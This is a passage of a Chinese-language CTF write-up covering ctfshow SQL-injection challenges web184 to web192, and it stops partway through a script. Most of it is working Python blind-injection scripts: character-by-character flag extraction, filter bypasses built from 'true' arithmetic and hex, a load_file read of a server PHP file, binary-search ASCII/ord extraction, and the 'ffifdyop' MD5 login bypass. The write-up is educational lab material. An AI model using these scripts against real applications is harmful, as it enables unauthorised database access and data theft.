  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">64</span>):<br>        <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> dicts:<br>            data = &#123;<span class="hljs-string">&#x27;tableName&#x27;</span>: <span class="hljs-string">f&quot;ctfshow_user group by pass having pass like 0x<span class="hljs-subst">&#123;tohex(flag + s + <span class="hljs-string">&#x27;%&#x27;</span>)&#125;</span>&quot;</span>&#125;<br>            <span class="hljs-keyword">try</span>:<br>                res = session.post(url, data=data)<br>                <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;$user_count = 1&#x27;</span> <span class="hljs-keyword">in</span> res.text:<br>                    flag += s<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Current flag: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br>                    <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">except</span> requests.RequestException <span class="hljs-keyword">as</span> e:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Error occurred: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>            time.sleep(<span class="hljs-number">0.5</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Final flag: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p>利用hex的进制转化进行比较得到flag</p><h2 id="web185"><a class="markdownIt-Anchor" href="#web185"></a> web185</h2><p>在前面的基础上还过滤了数字，跟着大师傅学学脚本</p><p>思路是利用true是1的原理就行构造数字</p><h3 id="0x01-8"><a class="markdownIt-Anchor" href="#0x01-8"></a> 0x01</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> string<br><br>url = <span class="hljs-string">&quot;http://0a600219-be65-4f96-a0b3-28d5e93923db.challenge.ctf.show/select-waf.php&quot;</span><br><br>dicts = string.digits+string.ascii_lowercase+<span class="hljs-string">&quot;-&quot;</span>+<span class="hljs-string">&quot;&#125;&quot;</span><br>flag = [<span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-string">&#x27;t&#x27;</span>, <span class="hljs-string">&#x27;f&#x27;</span>, <span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-string">&#x27;h&#x27;</span>, <span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>, <span class="hljs-string">&#x27;&#123;&#x27;</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">tofunc</span>(<span class="hljs-params">n</span>):<br>    strs = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>        strs += <span class="hljs-string">&#x27;+true&#x27;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;char(&#x27;</span> + strs + <span class="hljs-string">&#x27;)&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">1</span>,<span class="hljs-number">64</span>):<br>    <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> dicts:<br>        payload = flag + <span class="hljs-built_in">list</span>(s)<br>        payload.append(<span class="hljs-string">&quot;%&quot;</span>) <span class="hljs-comment"># 进行匹配</span><br>        concat_payload = <span class="hljs-string">&#x27;concat(&#x27;</span> +<span class="hljs-string">&#x27;,&#x27;</span>.join([tofunc(<span class="hljs-built_in">ord</span>(x))<span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> payload])+<span class="hljs-string">&#x27;)&#x27;</span><br>        data = &#123;<span class="hljs-string">&#x27;tableName&#x27;</span>:<span class="hljs-string">&#x27;ctfshow_user group by pass having pass like &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(concat_payload)&#125;<br>        res=requests.post(url,data=data)<br>        <span class="hljs-keyword">if</span> res.text.find(<span class="hljs-string">&#x27;$user_count = 0&#x27;</span>) == -<span class="hljs-number">1</span>:<br>            flag.append(s)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join(flag))<br>            time.sleep(<span class="hljs-number">3</span>)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><h3 id="0x02-8"><a class="markdownIt-Anchor" href="#0x02-8"></a> 0x02</h3><p>另外附上yu师傅的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#author:yu22x</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br>url=<span class="hljs-string">&quot;http://8319afbf-281c-4a73-b14e-a29426d0e556.challenge.ctf.show/select-waf.php&quot;</span><br>s=<span class="hljs-string">&#x27;0123456789abcdef-&#123;&#125;&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">convert</span>(<span class="hljs-params">strs</span>):<br>  t=<span class="hljs-string">&#x27;concat(&#x27;</span><br>  <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> strs:<br>    t+= <span class="hljs-string">&#x27;char(true&#x27;</span>+<span class="hljs-string">&#x27;+true&#x27;</span>*(<span class="hljs-built_in">ord</span>(s)-<span class="hljs-number">1</span>)+<span class="hljs-string">&#x27;),&#x27;</span><br>  <span class="hljs-keyword">return</span> t[:-<span class="hljs-number">1</span>]+<span class="hljs-string">&quot;)&quot;</span><br>flag=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">45</span>):<br>  <span class="hljs-built_in">print</span>(i)<br>  <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> s:<br>    d = convert(<span class="hljs-string">f&#x27;^ctfshow<span class="hljs-subst">&#123;flag+j&#125;</span>&#x27;</span>)<br>    data=&#123;<br>    <span class="hljs-string">&#x27;tableName&#x27;</span>:<span class="hljs-string">f&#x27; ctfshow_user group by pass having pass regexp(<span class="hljs-subst">&#123;d&#125;</span>)&#x27;</span><br>    &#125;<br>    <span class="hljs-comment">#print(data)</span><br>    r=requests.post(url,data=data)<br>    <span class="hljs-comment">#print(r.text)</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;user_count = 1&quot;</span>  <span class="hljs-keyword">in</span> r.text):<br>      flag+=j<br>      <span class="hljs-built_in">print</span>(flag)<br>      <span class="hljs-keyword">if</span> j==<span class="hljs-string">&#x27;&#125;&#x27;</span>:<br>        exit(<span class="hljs-number">0</span>)<br>      <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><h2 id="web186"><a class="markdownIt-Anchor" href="#web186"></a> web186</h2><p>同上题，两个脚本都可以使用，个人测评下来yu师傅的脚本快一点</p><h2 id="web187"><a class="markdownIt-Anchor" href="#web187"></a> web187</h2><p>早有耳闻的一个sql的MD5绕过，一直知道这个知识点，但是刷到的很少先上payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">admin ffifdyop<br></code></pre></td></tr></table></figure><p>需要抓包看回显得到flag，具体的分析，<a href="https://blog.csdn.net/qq_43427482/article/details/109849590">文章</a>这里简单的阐述一下内容，正常的MD5加密默认是32位，是以md5(‘xxx’,false)</p><p>但是使用md5(‘xxx’,true)进行加密转化的时候，会在这个基础上将字符串分割成16组然后每组转化为二进制再十进制，最后通过ASCII转化为字符串对 <code>ffifdyop</code> 字符串进行加密的时候, 会出现 <code>'or'6</code>, 相当于万能密码，以下是常用的两个payload</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs markdown">ffifdyop<br>129581926211651571912466741651878684928<br></code></pre></td></tr></table></figure><h2 id="web188"><a class="markdownIt-Anchor" href="#web188"></a> web188</h2><p>都传0就可以绕过了，记得bp抓包</p><p>判断是<code>username=&#123;$username&#125;</code>，并没有引号包裹，那么就可以输入数字了。数字和字符串的匹配是弱类型比较，字符串会转换为数字，如<code>0==admin</code>，那么如果输入的username是0，则会匹配所有开头不是数字或者为0的字符串和数字0。</p><p>看password的判断，也是弱类型的比较，那么也直接输入0，尝试登录一个用户名和pass的开头是字母或是0的用户。</p><h2 id="web189"><a class="markdownIt-Anchor" href="#web189"></a> web189</h2><p>hint是在api/index.php里，先尝试了上题的payload没有成功</p><p>尝试输入用户为1和0,一个是查询失败，一个是密码错误，说明为1的时候不存在用户，利用这里进行注入，参考参考脚本吧</p><p><code>load_file()</code> 是 MySQL 中的一个函数，用于读取服务器上的文件。它能够从指定的文件路径读取文件内容，并将其作为字符串返回。</p><p><code>regexp</code> 是 MySQL 中用于正则表达式匹配的操作符。它的作用是将文件内容与正则表达式进行匹配。</p><h3 id="0x01-9"><a class="markdownIt-Anchor" href="#0x01-9"></a> 0x01</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br>dicts=string.digits+string.ascii_lowercase+<span class="hljs-string">&quot;-&quot;</span>+<span class="hljs-string">&quot;&#125;&quot;</span><br>url = <span class="hljs-string">&#x27;http://91a55175-5819-43ae-bd47-e9b866b79eeb.challenge.ctf.show/api/index.php&#x27;</span><br>flag = <span class="hljs-string">&#x27;ctfshow&#123;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">64</span>):<br>    <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> dicts:<br>        payload = <span class="hljs-string">&#x27;if(load_file(\&#x27;/var/www/html/api/index.php\&#x27;)regexp(\&#x27;&#123;&#125;\&#x27;),1,0)&#x27;</span>.<span class="hljs-built_in">format</span>(flag+s)<br>        res = requests.post(url, data=&#123;<span class="hljs-string">&#x27;username&#x27;</span>:payload, <span class="hljs-string">&#x27;password&#x27;</span>:<span class="hljs-string">&#x27;1&#x27;</span>&#125;)<br>        <span class="hljs-keyword">if</span> res.text.find(<span class="hljs-string">&#x27;67e5&#x27;</span>) != -<span class="hljs-number">1</span>:<br>            flag += s<br>            <span class="hljs-built_in">print</span>(flag)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><h3 id="0x02-9"><a class="markdownIt-Anchor" href="#0x02-9"></a> 0x02</h3><p>还有官p</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&quot;http://91a55175-5819-43ae-bd47-e9b866b79eeb.challenge.ctf.show/api/index.php&quot;</span><br>flagstr = <span class="hljs-string">&quot;&#125;&#123;&lt;&gt;$=,;_ &#x27;abcdefghijklmnopqr-stuvwxyz0123456789&quot;</span><br><br>flag = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-comment">#这个位置，是群主耗费很长时间跑出来的位置~</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">257</span>,<span class="hljs-number">257</span>+<span class="hljs-number">60</span>):<br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> flagstr:<br>data=&#123;<br><span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;if(substr(load_file(&#x27;/var/www/html/api/index.php&#x27;),&#123;&#125;,1)=(&#x27;&#123;&#125;&#x27;),1,0)&quot;</span>.<span class="hljs-built_in">format</span>(i,x),<br><span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;0&quot;</span><br>&#125;<br><span class="hljs-built_in">print</span>(data)<br>response = requests.post(url,data=data)<br>time.sleep(<span class="hljs-number">0.3</span>)<br><span class="hljs-comment"># 8d25是username=1时的页面返回内容包含的，具体可以看上面的截图~</span><br><span class="hljs-keyword">if</span> response.text.find(<span class="hljs-string">&quot;8d25&quot;</span>)&gt;<span class="hljs-number">0</span>:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;++++++++++++++++++ &#123;&#125; is right&quot;</span>.<span class="hljs-built_in">format</span>(x))<br>flag+=x<br><span class="hljs-keyword">break</span><br><span class="hljs-keyword">else</span>:<br><span class="hljs-keyword">continue</span><br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><h2 id="web190"><a class="markdownIt-Anchor" href="#web190"></a> web190</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">where username = <span class="hljs-string">&#x27;&#123;$username&#125;&#x27;</span><span class="hljs-string">&quot;;</span><br></code></pre></td></tr></table></figure><p>根据这个可以用或进行绕过尝试注入得到flag，还是用盲注写</p><h3 id="0x01-10"><a class="markdownIt-Anchor" href="#0x01-10"></a> 0x01</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span>  time<br>dicts=string.digits+string.ascii_lowercase+<span class="hljs-string">&quot;-&quot;</span>+<span class="hljs-string">&quot;&#123;&#125;&quot;</span>+<span class="hljs-string">&quot;,&quot;</span><br>url = <span class="hljs-string">&#x27;http://27c9e10a-b6cd-4bcf-86e5-5a067c06f56e.challenge.ctf.show/api/index.php&#x27;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">64</span>):<br>  <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> dicts:<br>    <span class="hljs-comment">#payload = &#x27;select group_concat(table_name) from information_schema.tables where table_schema=database()&#x27;</span><br>    <span class="hljs-comment">#payload = &#x27;select group_concat(column_name) from information_schema.columns where table_name=\&#x27;ctfshow_fl0g\&#x27; and table_schema=database()&#x27;</span><br>    payload = <span class="hljs-string">&#x27;select f1ag from ctfshow_fl0g&#x27;</span><br>    s_payload = <span class="hljs-string">&#x27;admin\&#x27; and if(substr((&#123;&#125;),&#123;&#125;,1)=\&#x27;&#123;&#125;\&#x27;,1,0)#&#x27;</span>.<span class="hljs-built_in">format</span>(payload,i,s)<br>    res = requests.post(url,data=&#123;<span class="hljs-string">&#x27;username&#x27;</span>:s_payload,<span class="hljs-string">&#x27;password&#x27;</span>:<span class="hljs-string">&#x27;1&#x27;</span>&#125; )<br>    <span class="hljs-keyword">if</span> res.text.find(<span class="hljs-string">&#x27;5bc6&#x27;</span>) != -<span class="hljs-number">1</span>:<br>      flag += s<br>      <span class="hljs-built_in">print</span>(flag)<br>      time.sleep(<span class="hljs-number">0.5</span>)<br>      <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><h3 id="0x02-10"><a class="markdownIt-Anchor" href="#0x02-10"></a> 0x02</h3><p>利用二分法ASCII来写</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&quot;http://36e8713a-b1fb-49c2-badb-4c4d66f5d1cb.challenge.ctf.show/api/&quot;</span><br>flag = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">60</span>):<br>    <span class="hljs-built_in">max</span> = <span class="hljs-number">127</span><br>    <span class="hljs-built_in">min</span> = <span class="hljs-number">32</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>        mid = (<span class="hljs-built_in">max</span>+<span class="hljs-built_in">min</span>)&gt;&gt;<span class="hljs-number">1</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">min</span> == mid):<br>            flag += <span class="hljs-built_in">chr</span>(mid)<br>            <span class="hljs-built_in">print</span>(flag)<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-comment">#payload = &quot;admin&#x27;and (ascii(substr((select database()),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;.format(i,mid)</span><br>        <span class="hljs-comment">#ctfshow_web</span><br>        <span class="hljs-comment">#payload = &quot;admin&#x27;and (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;.format(i,mid)</span><br>        <span class="hljs-comment">#ctfshow_fl0g</span><br>        <span class="hljs-comment">#payload = &quot;admin&#x27;and (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_fl0g&#x27;),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;.format(i,mid)</span><br>        <span class="hljs-comment">#id,f1ag</span><br>        payload = <span class="hljs-string">&quot;admin&#x27;and (ascii(substr((select f1ag from ctfshow_fl0g),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)<br><br>        data = &#123;<br>            <span class="hljs-string">&quot;username&quot;</span>:payload,<br>            <span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-number">0</span>,<br>        &#125;<br>        res = requests.post(url = url,data =data)<br>        time.sleep(<span class="hljs-number">0.3</span>)<br>        <span class="hljs-keyword">if</span> res.text.find(<span class="hljs-string">&quot;8bef&quot;</span>)&gt;<span class="hljs-number">0</span>:<br>            <span class="hljs-built_in">max</span> = mid<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">min</span> = mid <br></code></pre></td></tr></table></figure><h2 id="web191"><a class="markdownIt-Anchor" href="#web191"></a> web191</h2><p>本题过滤了ASCII，可以继续web190的0x01</p><h3 id="0x01-11"><a class="markdownIt-Anchor" href="#0x01-11"></a> 0x01</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span>  time<br>dicts=string.digits+string.ascii_lowercase+<span class="hljs-string">&quot;-&quot;</span>+<span class="hljs-string">&quot;&#123;&#125;&quot;</span>+<span class="hljs-string">&quot;,&quot;</span><br>url = <span class="hljs-string">&#x27;http://42161408-1017-4aef-83ce-c22452b3d107.challenge.ctf.show/api/index.php&#x27;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">64</span>):<br>  <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> dicts:<br>    <span class="hljs-comment">#payload = &#x27;select group_concat(table_name) from information_schema.tables where table_schema=database()&#x27;</span><br>    <span class="hljs-comment">#payload = &#x27;select group_concat(column_name) from information_schema.columns where table_name=\&#x27;ctfshow_fl0g\&#x27; and table_schema=database()&#x27;</span><br>    payload = <span class="hljs-string">&#x27;select f1ag from ctfshow_fl0g&#x27;</span><br>    s_payload = <span class="hljs-string">&#x27;admin\&#x27; and if(substr((&#123;&#125;),&#123;&#125;,1)=\&#x27;&#123;&#125;\&#x27;,1,0)#&#x27;</span>.<span class="hljs-built_in">format</span>(payload,i,s)<br>    res = requests.post(url,data=&#123;<span class="hljs-string">&#x27;username&#x27;</span>:s_payload,<span class="hljs-string">&#x27;password&#x27;</span>:<span class="hljs-string">&#x27;1&#x27;</span>&#125; )<br>    <span class="hljs-keyword">if</span> res.text.find(<span class="hljs-string">&#x27;5bc6&#x27;</span>) != -<span class="hljs-number">1</span>:<br>      flag += s<br>      <span class="hljs-built_in">print</span>(flag)<br>      time.sleep(<span class="hljs-number">0.5</span>)<br>      <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><h3 id="0x02-11"><a class="markdownIt-Anchor" href="#0x02-11"></a> 0x02</h3><p>官方的思路是希望用ASCII改成ord来写脚本的，这里学一下两个的区别，脚本就直接贴了</p><p>ORD() 函数返回字符串第一个字符的ASCII 值，如果该字符是一个多字节（即一个或多个字节的序列），则MySQL函数将返回最左边字符的代码。如果字符不是多字节字符，则ORD()和ASCII()函数返回相似的结果；如果字符是多字节字符，则ASCII()只返回该字符最左侧的一个字节的ASCII值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&quot;http://60a3f535-f0c5-40d6-9e63-fe058bf95762.challenge.ctf.show/api/&quot;</span><br>flag = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">60</span>):<br>    <span class="hljs-built_in">max</span> = <span class="hljs-number">127</span><br>    <span class="hljs-built_in">min</span> = <span class="hljs-number">32</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>        mid = (<span class="hljs-built_in">max</span>+<span class="hljs-built_in">min</span>)&gt;&gt;<span class="hljs-number">1</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">min</span> == mid):<br>            flag += <span class="hljs-built_in">chr</span>(mid)<br>            <span class="hljs-built_in">print</span>(flag)<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-comment">#payload = &quot;admin&#x27;and (ord(substr((select database()),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;.format(i,mid)</span><br>        <span class="hljs-comment">#ctfshow_web</span><br>        <span class="hljs-comment">#payload = &quot;admin&#x27;and (ord(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;.format(i,mid)</span><br>        <span class="hljs-comment">#ctfshow_fl0g</span><br>        <span class="hljs-comment">#payload = &quot;admin&#x27;and (ord(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_fl0g&#x27;),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;.format(i,mid)</span><br>        <span class="hljs-comment">#id,f1ag</span><br>        payload = <span class="hljs-string">&quot;admin&#x27;and (ord(substr((select f1ag from ctfshow_fl0g),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)<br><br>        data = &#123;<br>            <span class="hljs-string">&quot;username&quot;</span>:payload,<br>            <span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-number">0</span>,<br>        &#125;<br>        res = requests.post(url = url,data =data)<br>        time.sleep(<span class="hljs-number">0.3</span>)<br>        <span class="hljs-keyword">if</span> res.text.find(<span class="hljs-string">&quot;8bef&quot;</span>)&gt;<span class="hljs-number">0</span>:<br>            <span class="hljs-built_in">max</span> = mid<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">min</span> = mid <br></code></pre></td></tr></table></figure><h2 id="web192"><a class="markdownIt-Anchor" href="#web192"></a> web192</h2><p>本题多过滤了ord和hex函数，还是可以继续用上面的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span>  time<br>dicts=string.digits+string.ascii_lowercase+<span class="hljs-string">&quot;-&quot;</span>+<span class="hljs-string">&quot;&#123;&#125;&quot;</span>+<span class="hljs-string">&quot;,&quot;</span><br>url = <span class="hljs-string">&#x27;http://6fec3a09-c862-4062-9893-f46b784267f2.challenge.ctf.show/api/index.php&#x27;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">64</span>):<br>  <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> dicts:<br>    <span class="hljs-comment">#payload = &#x27;select group_concat(table_name) from information_schema.tables where table_schema=database()&#x27;</span><br>    <span class="hljs-comment">#payload = &#x27;select group_concat(column_name) from information_schema.columns where table_name=\&#x27;ctfshow_fl0g\&#x27; and table_schema=database()&#x27;</span><br>    payload = <span class="hljs-string">&#x27;select f1ag from ctfshow_fl0g&#x27;</span><br>    s_payload = <span class="hljs-string">&#x27;admin\&#x27; and if(substr((&#123;&#125;),&#123;&#125;,1)=\&#x27;&#123;&#125;\&#x27;,1,0)#&#x27;</span>.<span class="hljs-built_in">format</span>(payload,i,s)<br>    res = requests.post(url,data=&#123;<span class="hljs-string">&#x27;username&#x27;</span>:s_payload,<span class="hljs-string">&#x27;password&#x27;</span>:<span 